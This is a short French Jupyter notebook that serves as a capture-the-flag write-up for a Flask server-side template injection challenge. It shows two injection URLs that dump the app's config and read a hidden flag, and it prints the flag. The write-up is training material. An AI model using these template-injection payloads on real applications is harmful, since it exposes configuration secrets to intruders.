{
 "cells": [
  {
   "attachments": {},
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# SSTI1\n",
    "\n",
    "> 100 points\n",
    "\n",
    "> https://ssti1.secu-web.blackfoot.dev/"
   ]
  },
  {
   "attachments": {},
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Première analyse\n",
    "\n",
    "- On a un champs text, qui, quand on rentre une string, l'écrit sur le site   \n",
    "- La page est créée coté serveur via un template\n",
    "- On sait que c'est une application Flask"
   ]
  },
  {
   "attachments": {},
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Première injection"
   ]
  },
  {
   "attachments": {},
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "```\n",
    "https://ssti1.secu-web.blackfoot.dev?username={{config.items()}}\n",
    "```"
   ]
  },
  {
   "attachments": {},
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Cette injection nous permet de récuperer des informations sur la configuration de l'application flask\n",
    "\n",
    "On peut vor que dans ces informations, un flag à été caché."
   ]
  },
  {
   "attachments": {},
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "```\n",
    "https://ssti1.secu-web.blackfoot.dev?username={{config[\"FLAG\"]}}\n",
    "```"
   ]
  },
  {
   "attachments": {},
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Flag\n",
    "\n",
    "Le flag est donc - BFS{WelC0m3_To_Th1s_F1rSt_PyTh0n_Vuln3rab1l1ty}"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".venv",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "name": "python",
   "version": "3.9.13 (v3.9.13:6de2ca5339, May 17 2022, 11:23:25) \n[Clang 6.0 (clang-600.0.57)]"
  },
  "orig_nbformat": 4,
  "vscode": {
   "interpreter": {
    "hash": "32dd59e9d9f0c4e0326cf96a9a56efb405dccc2be67dca9d03b974ee0c764ba9"
   }
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
